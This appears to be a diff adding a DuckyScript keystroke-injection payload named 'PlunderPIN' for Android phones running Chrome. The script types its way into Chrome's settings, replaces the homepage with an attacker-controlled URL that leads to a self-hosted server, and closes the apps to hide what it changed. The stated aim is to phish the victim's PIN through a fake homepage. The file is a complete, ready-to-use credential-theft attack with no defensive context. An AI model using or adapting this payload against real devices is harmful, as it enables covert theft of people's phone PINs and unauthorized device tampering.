@@ -1,0 +1,73 @@
+REM TITLE: PlunderPIN
+REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
+REM TARGET OS: Android mobile device/Google Chrome (tested on Samsung S24 FE | One UI V8.0 | Android 16 | Google Chrome 143.0.7499.53)
+REM DESCRIPTION: PlunderPIN is a mobile PIN phishing payload that replaces a user's Google Chrome browser homepage with a malicious imitation homepage that creates prompts to capture the user's PIN and log it to a self hosted Apache webserver. See README.md for full description.
+REM REQUIREMENTS: See README.md
+
+DEFINE #Apache_URL http://shorturl.at/Place-URL-Here
+
+REM Begin attack:
+ATTACKMODE HID
+DELAY 1000
+
+REM Opening Google Chrome:
+GUI f
+DELAY 400
+STRINGLN chrome
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 500
+
+REM Opening new tab to ensure proper default Chrome environment to execute payload properly:
+CTRL t
+DELAY 300
+SHIFT TAB
+DELAY 200
+ENTER
+DELAY 350
+
+REM Navigating to Homepage settings:
+REPEAT 8 DOWNARROW
+ENTER
+DELAY 350
+REPEAT 12 DOWNARROW
+ENTER
+
+REM Setting Apache webserver URL as default homepage:
+DELAY 250
+REPEAT 6 TAB
+DELAY 250
+CTRL a
+DELAY 250
+STRINGLN #Apache_URL
+DELAY 250
+
+REM Navigating back to original homepage and closing all tabs:
+ESC
+DELAY 100
+ESC
+DELAY 250
+SHIFT TAB
+DELAY 250
+ENTER
+DELAY 250
+REPEAT 4 TAB
+DELAY 250
+ENTER
+DELAY 250
+REPEAT 3 DOWNARROW
+DELAY 250
+ENTER
+DELAY 250
+REPEAT 2 TAB
+ENTER
+
+REM Closing applications (including browser) and returning to home screen:
+INJECT_MOD
+GUI TAB
+DELAY 300
+REPEAT 2 DOWNARROW
+DELAY 150
+ENTER
